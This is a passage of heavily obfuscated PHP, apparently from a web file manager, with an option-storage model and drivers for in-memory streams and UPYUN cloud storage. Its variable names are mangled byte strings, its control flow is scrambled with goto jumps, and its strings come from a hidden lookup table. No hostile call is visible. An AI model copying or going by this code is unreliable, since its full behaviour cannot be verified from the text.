!1; } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\163\x74\145\x6d\x4f\x70\164\151\157\156"; public $field = array(); public function listData($DÔĞ¨È¦´† = false, $a¡”‹×àãå = "\155\x6f\144\151\x66\x79\124\x69\155\145", $b©‰á¥­äÉ = false) { $c†«±ÉÅÂ = Model($this->modelType)->get(!1, $this->optionType, !0); if (!$c†«±ÉÅÂ) { return $DÔĞ¨È¦´† ? null : array(); } if (!$DÔĞ¨È¦´†) { $c†«±ÉÅÂ = array_filter(array_values($c†«±ÉÅÂ)); return array_sort_by($c†«±ÉÅÂ, $a¡”‹×àãå, $b©‰á¥­äÉ); } return $c†«±ÉÅÂ[$_SERVER[”Ì÷ñ­î¸][364] . $DÔĞ¨È¦´†]; } public function insert($E„ï´›¹³Ó) { goto A½„í½ÏÏ; c¢‘²Ÿ¹Ôò: $E„ï´›¹³Ó[$dçŞÆƒ¬»„[107]] = time(); Model($this->modelType)->set($dçŞÆƒ¬»„[365], $Eâ¿‡Ø¯‰, $this->optionType . $dçŞÆƒ¬»„[366]); Model($this->modelType)->set($dçŞÆƒ¬»„[364] . $Eâ¿‡Ø¯‰, $E„ï´›¹³Ó, $this->optionType); goto CÇ¡ˆ‘ ¨Œ; bæÚˆŒá‰Æ: $Eâ¿‡Ø¯‰ = $Eâ¿‡Ø¯‰ ? $Eâ¿‡Ø¯‰ : 0; $E„ï´›¹³Ó[$dçŞÆƒ¬»„[367]] = ++$Eâ¿‡Ø¯‰; $E„ï´›¹³Ó[$dçŞÆƒ¬»„[187]] = time(); goto c¢‘²Ÿ¹Ôò; A½„í½ÏÏ: $dçŞÆƒ¬»„ =& $_SERVER[”Ì÷ñ­î¸]; $E„ï´›¹³Ó = array_field_key($E„ï´›¹³Ó, $this->field); $Eâ¿‡Ø¯‰ = Model($this->modelType)->get($dçŞÆƒ¬»„[365], $this->optionType . $dçŞÆƒ¬»„[366]); goto bæÚˆŒá‰Æ; CÇ¡ˆ‘ ¨Œ: return $Eâ¿‡Ø¯‰; goto fÔë£ÑÆ£; fÔë£ÑÆ£: } public function update($BÁÍ«†Ò˜, $Aï¥©“Ş‘µ) { goto CØ¦®„òÙ; dŞ¨§¢áƒ¬: if (!$EÚî´Ìä¥) { return !1; } $Aï¥©“Ş‘µ = array_merge($EÚî´Ìä¥, $Aï¥©“Ş‘µ); $Aï¥©“Ş‘µ[$Aæ³º”Ù²ß[107]] = time(); goto C­¡¿æäˆ; CØ¦®„òÙ: $Aæ³º”Ù²ß =& $_SERVER[”Ì÷ñ­î¸]; $Aï¥©“Ş‘µ = array_field_key($Aï¥©“Ş‘µ, $this->field); $EÚî´Ìä¥ = $this->listData($BÁÍ«†Ò˜); goto dŞ¨§¢áƒ¬; C­¡¿æäˆ: return Model($this->modelType)->set($Aæ³º”Ù²ß[364] . $BÁÍ«†Ò˜, $Aï¥©“Ş‘µ, $this->optionType); goto FİÛ–Òé; FİÛ–Òé: } public function remove($EÚËãÅÚùÄ) { return Model($this->modelType)->remove($_SERVER[”Ì÷ñ­î¸][364] . $EÚËãÅÚùÄ, $this->optionType); } public function clear() { $Böˆå¦ =& $_SERVER[”Ì÷ñ­î¸]; Model($this->modelType)->remove($Böˆå¦[365], $this->optionType . $Böˆå¦[366]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($a½ë‚‹òŠ¯, $E¶Á™È¶Ì´) { if (!$E¶Á™È¶Ì´) { return !1; } $fÃëÍÃèâİ = $this->listData(); $fÃëÍÃèâİ = array_to_keyvalue($fÃëÍÃèâİ, $a½ë‚‹òŠ¯); return isset($fÃëÍÃèâİ[$E¶Á™È¶Ì´]) ? $fÃëÍÃèâİ[$E¶Á™È¶Ì´] : !1; } public function findByName($a’’Ø„»ª) { return $this->findByKey($_SERVER[”Ì÷ñ­î¸][28], $a’’Ø„»ª); } protected function resetData($cÒŒ¡Å¥Ñ›) { $B„Ñï „Ó =& $_SERVER[”Ì÷ñ­î¸]; $cÒŒ¡Å¥Ñ› = is_array($cÒŒ¡Å¥Ñ›) ? $cÒŒ¡Å¥Ñ› : array(); $CŒ¡ˆ„ÌäÛ = array(); for ($DòŒÍ®õö‡ = 0; $DòŒÍ®õö‡ < count($cÒŒ¡Å¥Ñ›); $DòŒÍ®õö‡++) { $CŒ¡ˆ„ÌäÛ[$B„Ñï „Ó[364] . $cÒŒ¡Å¥Ñ›[$DòŒÍ®õö‡][$B„Ñï „Ó[367]]] = $cÒŒ¡Å¥Ñ›[$DòŒÍ®õö‡]; } return Model($this->modelType)->set($CŒ¡ˆ„ÌäÛ, !1, $this->optionType); } private function getAutoName($dÄ„¬ìí») { $eóĞƒ•·¹² = array_to_keyvalue($this->listData(), $_SERVER[”Ì÷ñ­î¸][28]); if (!$eóĞƒ•·¹² || !isset($eóĞƒ•·¹²[$dÄ„¬ìí»])) { return $dÄ„¬ìí»; } for ($Dù…áõâšİ = 1; $Dù…áõâšİ < count($eóĞƒ•·¹²); $Dù…áõâšİ++) { $Fâ•®ŒÂ’ = $dÄ„¬ìí» . "\x28{$Dù…áõâšİ}\x29"; if (!isset($eóĞƒ•·¹²[$Fâ•®ŒÂ’])) { return $Fâ•®ŒÂ’; } } return $Fâ•®ŒÂ’; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($E‰ŠàÀ¥ê = false, $F×…¬Šõ“ = '', $D…÷°äœŸĞ = false) { goto fÉÚÑœ‹çª; fÉÚÑœ‹çª: $E…ƒĞñá½¹ =& $_SERVER[”Ì÷ñ­î¸]; $A¿õÜ´Ï’ì = $this->cacheGet($F×…¬Šõ“); $fÒŒ“¥à = $this->optionDefault($F×…¬Šõ“); goto EØÀÂİÕöß; B«ç–ò™ßÒ: $A¿õÜ´Ï’ì = $this->where($C†õùëÍÜ)->select(); $A¿õÜ´Ï’ì = array_to_keyvalue($A¿õÜ´Ï’ì, $E…ƒĞñá½¹[89], $E…ƒĞñá½¹[359]); foreach ($A¿õÜ´Ï’ì as $bÆ÷Í¥†º› => $d•Ò„Ñ‚æß) { if ($D…÷°äœŸĞ || in_array($bÆ÷Í¥†º›, $this->jsonField)) { $A¿õÜ´Ï’ì[$bÆ÷Í¥†º›] = json_decode($d•Ò„Ñ‚æß, !0); } } goto a·ã¢áäÓç; EØÀÂİÕöß: $fÒŒ“¥à = is_array($fÒŒ“¥à) ? $fÒŒ“¥à : array(); if (is_array($A¿õÜ´Ï’ì)) { $A¿õÜ´Ï’ì = array_merge($fÒŒ“¥à, $A¿õÜ´Ï’ì); return $E‰ŠàÀ¥ê ? isset($A¿õÜ´Ï’ì[$E‰ŠàÀ¥ê]) ? $A¿õÜ´Ï’ì[$E‰ŠàÀ¥ê] : null : $A¿õÜ´Ï’ì; } $C†õùëÍÜ = $this->filterWhere(array($E…ƒĞñá½¹[29] => $F×…¬Šõ“)); goto B«ç–ò™ßÒ; a·ã¢áäÓç: $this->cacheSet($F×…¬Šõ“, $A¿õÜ´Ï’ì); $A¿õÜ´Ï’ì = array_merge($fÒŒ“¥à, $A¿õÜ´Ï’ì); return $E‰ŠàÀ¥ê ? $A¿õÜ´Ï’ì[$E‰ŠàÀ¥ê] : $A¿õÜ´Ï’ì; goto FØïÌ´¿ Á; FØïÌ´¿ Á: } public function set($EÀÅ„ğÒÒ«, $Eœš«Òß« = false, $B¤¸ç¸µÌÙ = '') { goto eŒ¨ÈçË›ß; c¦®Û®: return $this->addAll($eÍÍñŠ»ªÂ, array(), !0); goto dòéŒÊæ¢­; CÈÀ÷—ê¥: $E®›³¾¹òŒ = is_array($EÀÅ„ğÒÒ«) ? $EÀÅ„ğÒÒ« : array($EÀÅ„ğÒÒ« => $Eœš«Òß«); foreach ($E®›³¾¹òŒ as $a‚Üƒ¦ìó => $EÖ‡ôÌ“¤) { if (is_array($EÖ‡ôÌ“¤)) { $EÖ‡ôÌ“¤ = json_encode_force($EÖ‡ôÌ“¤); } $this->checkLength($EÖ‡ôÌ“¤, !1, $this->tableName . $böÜåãá¾Â[4] . $EÀÅ„ğÒÒ«); $EÖ‡ôÌ“¤ = self::textEncode($EÖ‡ôÌ“¤); $E®›³¾¹òŒ = array($böÜåãá¾Â[29] => $B¤¸ç¸µÌÙ, $böÜåãá¾Â[89] => $a‚Üƒ¦ìó, $böÜåãá¾Â[359] => $EÖ‡ôÌ“¤); $eÍÍñŠ»ªÂ[] = $this->filterWhere($E®›³¾¹òŒ); } if (!$eÍÍñŠ»ªÂ) { return !0; } goto c¦®Û®; eŒ¨ÈçË›ß: $böÜåãá¾Â =& $_SERVER[”Ì÷ñ­î¸]; $this->cacheRemove($B¤¸ç¸µÌÙ); $eÍÍñŠ»ªÂ = array(); goto CÈÀ÷—ê¥; dòéŒÊæ¢­: } protected function optionDefault($eòã…ÁÂ¨ = '') { return !1; } public function setDeep($b¼Æ¥ùÈ‘, $CØÙšµ¼–ß = false, $FæÒ½ñÕ† = '') { $fÈô·–ï°¯ = explode($_SERVER[”Ì÷ñ­î¸][91], $b¼Æ¥ùÈ‘); $Bâ÷«ööË¯ = $this->get(); array_set_value($Bâ÷«ööË¯, $b¼Æ¥ùÈ‘, $CØÙšµ¼–ß); $this->set($fÈô·–ï°¯[0], $Bâ÷«ööË¯[$fÈô·–ï°¯[0]], $FæÒ½ñÕ†); } public function remove($CŠêç³Ó, $fäà°…ÈË = '') { $Fâæ¡¼—¹‚ =& $_SERVER[”Ì÷ñ­î¸]; $this->cacheRemove($fäà°…ÈË); $cÍ‚³²¡àÛ = $this->filterWhere(array($Fâæ¡¼—¹‚[89] => $CŠêç³Ó, $Fâæ¡¼—¹‚[29] => $fäà°…ÈË)); if (is_null($CŠêç³Ó)) { unset($cÍ‚³²¡àÛ[$Fâæ¡¼—¹‚[89]]); } return $this->where($cÍ‚³²¡àÛ)->delete(); } public function cacheSet($CèØİ·‹ô, $C¼°ˆ×—ì = false) { return Cache::set($this->cacheKey($CèØİ·‹ô), $C¼°ˆ×—ì); } public function cacheGet($bó¾Ğ¡ù ©) { return Cache::get($this->cacheKey($bó¾Ğ¡ù ©)); } public function cacheRemove($fíê¯ßäÛ–) { return Cache::remove($this->cacheKey($fíê¯ßäÛ–)); } protected function filterWhere($fÖå‹»±½È) { return $fÖå‹»±½È; } protected function cacheKey($cÑ§¬‘ˆ‘) { return $cÑ§¬‘ˆ‘; } } goto Dõëó³…ˆß; Cà¤¡·ƒ: register_shutdown_function($_SERVER[æÒğ][36]); set_error_handler($_SERVER[æÒğ][49], $A¿òÈõ£»); if (function_exists($_SERVER[æÒğ][50])) { set_exception_handler($_SERVER[æÒğ][51]); } goto AóÑÛ¼‹ÆŞ; dæÄŒØ‰: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($BğÍÖ©Áè¿, $F´Ä¢õé¡ = 0) { parent::__construct(); $this->source = $BğÍÖ©Áè¿; $this->sourceSize = $F´Ä¢õé¡; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($Aå‘‡ŠÈŸ = false) { return $this->sourceSize; } public function getContent($e®Ì…éº© = false) { if ($this->sourceType == self::TYPE_STRING) { return $this->source; } if ($this->sourceType == self::TYPE_FILE) { $Böøóî×Ä‹ = ftell($this->source); $DòË¹±Š¡¦ = @fread($this->source, $this->sourceSize); fseek($this->source, $Böøóî×Ä‹); return $DòË¹±Š¡¦; } } public function fileSubstr($a¾¥ÕÇ‡‘Ê = false, $d‡‚ÇÌê¯¨ = 0, $Cù†Ï¿©‡‡ = 0) { if (!$Cù†Ï¿©‡‡) { $Cù†Ï¿©‡‡ = $this->sourceSize; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $d‡‚ÇÌê¯¨, $Cù†Ï¿©‡‡); } if ($this->sourceType == self::TYPE_FILE) { $B§ß„·ïïÄ = ftell($this->source); fseek($this->source, $B§ß„·ïïÄ + $d‡‚ÇÌê¯¨); $c³‡µ¢±Òœ = @fread($this->source, $Cù†Ï¿©‡‡); fseek($this->source, $B§ß„·ïïÄ); return $c³‡µ¢±Òœ; } } public function hashMd5($D“ˆ“ìÅğº = false) { return md5($this->getContent()); } public static function hash($D£¬Œ‡ùˆ, $eñÊíã³¾¦ = 0) { $FÍ”óš´È = new PathDriverStream($D£¬Œ‡ùˆ, $eñÊíã³¾¦); return $FÍ”óš´È->hashSimple($D£¬Œ‡ùˆ); } public static function md5($c“Œ¬È å‹, $aˆ¡ŞÎ×¦ = 0) { $cİ«…¨°Ö« = new PathDriverStream($c“Œ¬È å‹, $aˆ¡ŞÎ×¦); return $cİ«…¨°Ö«->hashMd5($c“Œ¬È å‹); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\160\x3a\x2f\57\x76\x30\56\x61\x70\x69\56\x75\160\171\x75\156\56\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($eá¾‡ÜŸ¾±) { parent::__construct(); $this->_init($eá¾‡ÜŸ¾±); } public function _init($B¹¢í”‚Ÿ‡) { foreach ($B¹¢í”‚Ÿ‡ as $Fâ¶Â­Öœ => $BãŠĞ›†¥) { if (isset($this->{$Fâ¶Â­Öœ})) { $this->{$Fâ¶Â­Öœ} = $BãŠĞ›†¥; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { show_json($_SERVER[”Ì÷ñ­î¸][1243], !1); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($dŒğõÅ„òİ, $fÂ­ö‰ßÕß = "\x47\105\x54") { $eˆ‡ªÅ”ç =& $_SERVER[”Ì÷ñ­î¸]; $EÍ±¡ù¯¾ = gmdate($eˆ‡ªÅ”ç[1207]); $cÂÌ¯İèÎñ = base64_encode(hash_hmac($eˆ‡ªÅ”ç[1244], "{$fÂ­ö‰ßÕß}\x26{$dŒğõÅ„òİ}\x26{$EÍ±¡ù¯¾}", md5("{$this->userpass}"), !0)); $c©öòïí½µ = array("\x41\165\164\x68\x6f\162\x69\172\x61\164\151\157\x6e\72\x55\120\131\125\x4e\40{$this->username}\x3a{$cÂÌ¯İèÎñ}", "\104\x61\164\145\72{$EÍ±¡ù¯¾}"); return $c©öòïí½µ; } public function ussRequest($D…Æê­Ä‰˜, $DªÏš¹È¦ = "\x47\x45\124", $Dæùµé½æå = false, $C˜¥¹¿µ¢ = false, $fÏ«¯øçœ° = false) { goto BøË¨˜­é²; c¨Œç ©¯ê: if (!$DÛİæê¹) { return array($bîÃ¡«‡„ˆ[1032] => !1, $bîÃ¡«‡„ˆ[1034] => $bîÃ¡«‡„ˆ[1245]); } if (strtolower($DªÏš¹È¦) == $bîÃ¡«‡„ˆ[184] || in_array($DÛİæê¹[$bîÃ¡«‡„ˆ[1032]], array($bîÃ¡«‡„ˆ[1100], $bîÃ¡«‡„ˆ[1246]))) { $Dæùµé½æå = $DÛİæê¹[$bîÃ¡«‡„ˆ[1247]]; } else { $Dæùµé½æå = json_decode($DÛİæê¹[$bîÃ¡«‡„ˆ[1034]], !0); if (!$Dæùµé½æå) { $Dæùµé½æå = $DÛİæê¹[$bîÃ¡«‡„ˆ[1034]]; } else { if (!$DÛİæê¹[$bîÃ¡«‡„ˆ[690]] && isset($Dæùµé½æå[$bîÃ¡«‡„ˆ[1248]])) { $Dæùµé½æå = $Dæùµé½æå[$bîÃ¡«‡„ˆ[1248]]; } } } return array($bîÃ¡«‡„ˆ[1032] => $DÛİæê¹[$bîÃ¡«‡„ˆ[690]], $bîÃ¡«‡„ˆ[1034] => $Dæùµé½æå); goto bºØ¥äèÑ¬; CõĞ†Äˆƒ: $CœÅÜîº÷ = $this->ussHeaders($bê¢ÁÁì¨¥, $DªÏš¹È¦); if ($C˜¥¹¿µ¢) { $CœÅÜîº÷ = array_merge($CœÅÜîº÷, $C˜¥¹¿µ¢); } $DÛİæê¹ = url_request($this->endpoint . $bê¢ÁÁì¨¥, $DªÏš¹È¦, $Dæùµé½æå, $CœÅÜîº÷, $fÏ«¯øçœ°); goto c¨Œç ©¯ê; BøË¨˜­é²: $bîÃ¡«‡„ˆ =& $_SERVER[”Ì÷ñ­î¸]; $D…Æê­Ä‰˜ = trim($D…Æê­Ä‰˜, $bîÃ¡«‡„ˆ[8]); $bê¢ÁÁì¨¥ = "\x2f{$this->bucket}\57{$D…Æê­Ä‰˜}"; goto CõĞ†Äˆƒ; bºØ¥äèÑ¬: } public function mkfile($dĞ–ÕÄŒèš, $c¤éÛ¼Êã¥ = '', $DöÚÆ¯‡ = REPEAT_RENAME) { if ($this->setContent($dĞ–ÕÄŒèš, $c¤éÛ¼Êã¥)) { return $this->getPathOuter($dĞ–ÕÄŒèš); } return !1; } public function mkdir($BŒŠ¦Š Ó–, $bÑ¢Ÿƒíµ¤ = REPEAT_SKIP) { $a¾àÔ«öœ =& $_SERVER[”Ì÷ñ­î¸]; $EÅé“Äª®Ô = trim($BŒŠ¦Š Ó–, $a¾àÔ«öœ[8]); if ($this->_isFolder($EÅé“Äª®Ô)) { return $this->getPathOuter($EÅé“Äª®Ô); } $DÎ÷à÷¨è‰ = array($a¾àÔ«öœ[1249]); $a»ŸÙÚÀ÷ = $this->ussRequest($EÅé“Äª®Ô, $a¾àÔ«öœ[212], !1, $DÎ÷à÷¨è‰); return $a»ŸÙÚÀ÷[$a¾àÔ«öœ[1032]] ? $this->getPathOuter($EÅé“Äª®Ô) : !1; } public function copyFile($Déä§Êì¾—, $E‡Ù³æ¼ßŒ) { $F·íá‘”© =& $_SERVER[”Ì÷ñ­î¸]; $b˜—ÅØÓí = array($F·íá‘”©[1250] . "\57{$this->bucket}\57{$Déä§Êì¾—}", $F·íá‘”©[1251]); $D˜‚©´ÀÎÖ = $this->ussRequest($E‡Ù³æ¼ßŒ, $F·íá‘”©[214], !1, $b˜—ÅØÓí); return $D˜‚©´ÀÎÖ[$F·íá‘”©[1032]] ? !0 : !1; } public function moveFile($BÎÓ·‚¨¼, $D­ÆÍ¨Í) { $F«ñïÕ“çÄ =& $_SERVER[”Ì÷ñ­î¸]; $D‘¹—Éàö¡ = array($F«ñïÕ“çÄ[1252] . "\x2f{$this->bucket}\x2f{$BÎÓ·‚¨¼}", $F«ñïÕ“çÄ[1251]); $F¼Ò´ºÓ®õ = $this->ussRequest($D­ÆÍ¨Í, $F«ñïÕ“çÄ[214], !1, $D‘¹—Éàö¡); return $F¼Ò´ºÓ®õ[$F«ñïÕ“çÄ[1032]] ? !0 : !1; } public function delFile($B»£Š·ÕÏ) { $fô†ãçß =& $_SERVER[”Ì÷ñ­î¸]; $Aò™ÁøÉ± = $this->ussRequest($B»£Š·ÕÏ, $fô†ãçß[1253]); return $Aò™ÁøÉ±[$fô†ãçß[1032]] ? !0 : !1; } public function delFolder($cİ‰²÷Ò˜ê) { $e¿ÄÍŸ­ôÑ =& $_SERVER[”Ì÷ñ­î¸]; $dº÷§ Õ£Ì = $this->listAll($cİ‰²÷Ò˜ê); krsort($dº÷§ Õ£Ì); foreach ($dº÷§ Õ£Ì as $Dİ…öëƒÒà) { $this->ussRequest($Dİ…öëƒÒà[$e¿ÄÍŸ­ôÑ[75]], $e¿ÄÍŸ­ôÑ[1253]); } return $this->ussRequest($cİ‰²÷Ò˜ê, $e¿ÄÍŸ­ôÑ[1253]); } public function rename($CØ§Ã»§Ø†, $e­›ÀÊŸµ) { if ($this->isFile($CØ§Ã»§Ø†)) { $e­›ÀÊŸµ = get_path_father($CØ§Ã»§Ø†) . $e­›ÀÊŸµ; return $this->moveFile($CØ§Ã»§Ø†, $e­›ÀÊŸµ); } return $this->renameObject($CØ§Ã»§Ø†, $e­›ÀÊŸµ); } public function fileInfo($f¢œÚÒÂ, $FæÎº©ƒÊ = false, $cˆ¥ãø“øÌ = array()) { $FˆÇäÄ²˜ =& $_SERVER[”Ì÷ñ­î¸]; if ($FæÎº©ƒÊ) { return array($FˆÇäÄ²˜[28] => $this->pathThis($f¢œÚÒÂ), $FˆÇäÄ²˜[75] => $this->getPathOuter($FˆÇäÄ²˜[8] . $f¢œÚÒÂ), $FˆÇäÄ²˜[29] => $FˆÇäÄ²˜[167], $FˆÇäÄ²˜[77] => isset($cˆ¥ãø“øÌ[$FˆÇäÄ²˜[325]]) ? $cˆ¥ãø“øÌ[$FˆÇäÄ²˜[325]] : 0, $FˆÇäÄ²˜[160] => $this->ext($f¢œÚÒÂ)); } $AÖï°…§©Ú = array($FˆÇäÄ²˜[28] => $this->pathThis($f¢œÚÒÂ), $FˆÇäÄ²˜[75] => $this->getPathOuter($FˆÇäÄ²˜[8] . $f¢œÚÒÂ), $FˆÇäÄ²˜[29] => $FˆÇäÄ²˜[167], $FˆÇäÄ²˜[187] => 0, $FˆÇäÄ²˜[107] => isset($bòÄ¯Íåî[$FˆÇäÄ²˜[1254]]) ? $bòÄ¯Íåî[$FˆÇäÄ²˜[1254]] : 0, $FˆÇäÄ²˜[77] => isset($cˆ¥ãø“øÌ[$FˆÇäÄ²˜[325]]) ? $cˆ¥ãø“øÌ[$FˆÇäÄ²˜[325]] : 0, $FˆÇäÄ²˜[160] => $this->ext($f¢œÚÒÂ), $FˆÇäÄ²˜[188] => !0, $FˆÇäÄ²˜[189] => !0); if (empty($cˆ¥ãø“øÌ)) { $cˆ¥ãø“øÌ = $this->objectMeta($f¢œÚÒÂ); if (!$cˆ¥ãø“øÌ) { return $AÖï°…§©Ú; } $AÖï°…§©Ú[$FˆÇäÄ²˜[187]] = $cˆ¥ãø“øÌ[$FˆÇäÄ²˜[1255]]; $AÖï°…§©Ú[$FˆÇäÄ²˜[107]] = $cˆ¥ãø“øÌ[$FˆÇäÄ²˜[1256]]; $AÖï°…§©Ú[$FˆÇäÄ²˜[77]] = $cˆ¥ãø“øÌ[$FˆÇäÄ²˜[77]]; } return $AÖï°…§©Ú; } public function folderInfo($B˜Å¾Ê¦›, $CÁ‹Ûïôó = false) { $b™ÁÇ‚ø™è =& $_SERVER[”Ì÷ñ­î¸]; if ($CÁ‹Ûïôó) { return array($b™ÁÇ‚ø™è[28] => $this->pathThis($B˜Å¾Ê¦›), $b™ÁÇ‚ø™è[75] => $this->getPathOuter($b™ÁÇ‚ø™è[8] . $B˜Å¾Ê¦›), $b™ÁÇ‚ø™è[29] => $b™ÁÇ‚ø™è[76]); } $EØ±©œî·’ = array($b™ÁÇ‚ø™è[28] => $this->pathThis($B˜Å¾Ê¦›), $b™ÁÇ‚ø™è[75] => $this->getPathOuter($b™ÁÇ‚ø™è[8] . $B˜Å¾Ê¦›), $b™ÁÇ‚ø™è[29] => $b™ÁÇ‚ø™è[76], $b™ÁÇ‚ø™è[187] => 0, $b™ÁÇ‚ø™è[107] => isset($C§ç…®Ÿ’ò[$b™ÁÇ‚ø™è[1254]]) ? $C§ç…®Ÿ’ò[$b™ÁÇ‚ø™è[1254]] : 0, $b™ÁÇ‚ø™è[1164] => !0, $b™ÁÇ‚ø™è[1165] => !0); if (empty($E¥‰Ùµ±Æî)) { $E¥‰Ùµ±Æî = $this->objectMeta($B˜Å¾Ê¦›); if (!$E¥‰Ùµ±Æî) { return $EØ±©œî·’; } $EØ±©œî·’[$b™ÁÇ‚ø™è[187]] = $E¥‰Ùµ±Æî[$b™ÁÇ‚ø™è[1255]]; $EØ±©œî·’[$b™ÁÇ‚ø™è[107]] = $E¥‰Ùµ±Æî[$b™ÁÇ‚ø™è[1256]]; } return $EØ±©œî·’; } private function fileList($e–´äÁÉ´Å, $dÈÍˆ¡¹Á = 0, $Aø¯ÂÎ…¶İ = 1000) { $aøéï‘¢‡ =& $_SERVER[”Ì÷ñ­î¸]; $C¬ôÖ×íä„ = array($aøéï‘¢‡[1257], $aøéï‘¢‡[1258] . $Aø¯ÂÎ…¶İ); if ($dÈÍˆ¡¹Á) { $C¬ôÖ×íä„[] = $aøéï‘¢‡[1259] . $dÈÍˆ¡¹Á; } $fòÖÅÌ¹é× = $this->ussRequest($e–´äÁÉ´Å, $aøéï‘¢‡[216], !1, $C¬ôÖ×íä„); return !$fòÖÅÌ¹é×[$aøéï‘¢‡[1032]] ? !1 : $fòÖÅÌ¹é×[$aøéï‘¢‡[1034]]; } public function listPath($d‡»ŠÛíì¹, $D×¿…š–¸ = false) { goto d¨”ˆÃ°Šø; d¨”ˆÃ°Šø: $E†Áœ†œÕ® =& $_SERVER[”Ì÷ñ­î¸]; $aœ•ä‡ñ´ = $E†Áœ†œÕ®[33]; $C’¢¿–ƒ = 1000; goto dË‹ÈÒ„œ‘; A¤…É„„§: return array($E†Áœ†œÕ®[74] => $CÂ»õÂÉõÚ, $E†Áœ†œÕ®[73] => $bÈ½Ê¤ƒÅ¦); goto d³º…êÔ°¾; dË‹ÈÒ„œ‘: $CÂ»õÂÉõÚ = $bÈ½Ê¤ƒÅ¦ = array(); $AçÂ‚Å«â… = rtrim($d‡»ŠÛíì¹, $E†Áœ†œÕ®[8]) . $E†Áœ†œÕ®[8]; while (!0) { $Cë»‰Ğ¯ç‡ = $this->fileList($d‡»ŠÛíì¹, $aœ•ä‡ñ´, $C’¢¿–ƒ); if (!$Cë»‰Ğ¯ç‡) { return !1; } $aœ•ä‡ñ´ = isset($Cë»‰Ğ¯ç‡[$E†Áœ†œÕ®[1260]]) ? $Cë»‰Ğ¯ç‡[$E†Áœ†œÕ®[1260]] : $E†Áœ†œÕ®[33]; $d¬„’¶÷ç¢ = isset($Cë»‰Ğ¯ç‡[$E†Áœ†œÕ®[1261]]) ? $Cë»‰Ğ¯ç‡[$E†Áœ†œÕ®[1261]] : array(); foreach ($d¬„’¶÷ç¢ as $CŠàõÈñÀê) { if ($CŠàõÈñÀê[$E†Áœ†œÕ®[29]] == $E†Áœ†œÕ®[76]) { $CÂ»õÂÉõÚ[] = $this->folderInfo($AçÂ‚Å«â… . $CŠàõÈñÀê[$E†Áœ†œÕ®[28]], $D×¿…š–¸, $CŠàõÈñÀê); } else { $bÈ½Ê¤ƒÅ¦[] = $this->fileInfo($AçÂ‚Å«â… . $CŠàõÈñÀê[$E†Áœ†œÕ®[28]], $D×¿…š–¸, $CŠàõÈñÀê); } } if (count($d¬„’¶÷ç¢) < $C’¢¿–ƒ) { break; } } goto A¤…É„„§; d³º…êÔ°¾: } private function recursionAllFiles($C¼ø÷Ÿì³Š, &$bŸÎİÍçñ) { $e†ÅùĞ«´ =& $_SERVER[”Ì÷ñ­î¸]; $Aª¨½ù‘Ê˜ = $e†ÅùĞ«´[33]; $a…òñÂõ» = 1000; $FªàÚ¯™àô = $b…ˆ¨õºÓŠ = array(); $Eò¨‚Ñ¶Â‘ = rtrim($C¼ø÷Ÿì³Š, $e†ÅùĞ«´[8]) . $e†ÅùĞ«´[8]; while (!0) { $CĞÓÎŞ¼àå = $this->fileList($C¼ø÷Ÿì³Š, $Aª¨½ù‘Ê˜, $a…òñÂõ»); if (!$CĞÓÎŞ¼àå) { return !1; } $Aª¨½ù‘Ê˜ = isset($CĞÓÎŞ¼àå[$e†ÅùĞ«´[1260]]) ? $CĞÓÎŞ¼àå[$e†ÅùĞ«´[1260]] : $e†ÅùĞ«´[33]; $eéáˆÔ¢Ùİ = isset($CĞÓÎŞ¼àå[$e†ÅùĞ«´[1261]]) ? $CĞÓÎŞ¼àå[$e†ÅùĞ«´[1261]] : array(); foreach ($eéáˆÔ¢Ùİ as $dô½•æ¦À¤) { $Bœ„Îç©¾§ = array($e†ÅùĞ«´[75] => $Eò¨‚Ñ¶Â‘ . $dô½•æ¦À¤[$e†ÅùĞ«´[28]], $e†ÅùĞ«´[76] => $dô½•æ¦À¤[$e†ÅùĞ«´[29]] == $e†ÅùĞ«´[76] ? 1 : 0, $e†ÅùĞ«´[77] => isset($dô½•æ¦À¤[$e†ÅùĞ«´[325]]) ? $dô½•æ¦À¤[$e†ÅùĞ«´[325]] : 0); $bŸÎİÍçñ[] = $Bœ„Îç©¾§; if ($Bœ„Îç©¾§[$e†ÅùĞ«´[76]] == 1) { $this->recursionAllFiles($Bœ„Îç©¾§[$e†ÅùĞ«´[75]], $bŸÎİÍçñ); } } if (count($eéáˆÔ¢Ùİ) < $a…òñÂõ») { break; } } } public function has($A¯ëÂ…©ĞŠ, $E‰È†ö¯ï = false, $D•Ìí£ğŒæ = true) { goto bÜ¶í°Ü; DÙ«î¢’‹ã: $FÅíÆÍã³ß = 0; $d±½Ùæø  = 0; $AÒ‘ò¡Î = rtrim($A¯ëÂ…©ĞŠ, $bõçô„‰ƒ…[8]) . $bõçô„‰ƒ…[8]; goto Aî£ã÷ë“‡; Aî£ã÷ë“‡: while (!0) { $eëœÚšÁˆ‰ = $this->fileList($A¯ëÂ…©ĞŠ, $fÆ²Šë¥«§, $Døù£âçï‘); if (!$eëœÚšÁˆ‰) { return !1; } $fÆ²Šë¥«§ = isset($eëœÚšÁˆ‰[$bõçô„‰ƒ…[1260]]) ? $eëœÚšÁˆ‰[$bõçô„‰ƒ…[1260]] : $bõçô„‰ƒ…[33]; $A¡¥œ‚âì÷ = isset($eëœÚšÁˆ‰[$bõçô„‰ƒ…[1261]]) ? $eëœÚšÁˆ‰[$bõçô„‰ƒ…[1261]] : array(); if (empty($A¡¥œ‚âì÷)) { break; } $f³îƒ¯¡¢² = array_to_keyvalue($A¡¥œ‚âì÷, $bõçô„‰ƒ…[33], $bõçô„‰ƒ…[29]); $Aî àáÄˆÆ = array_count_values($f³îƒ¯¡¢²); $då÷Ëáİ‚ = isset($Aî àáÄˆÆ[$bõçô„‰ƒ…[76]]) ? $Aî 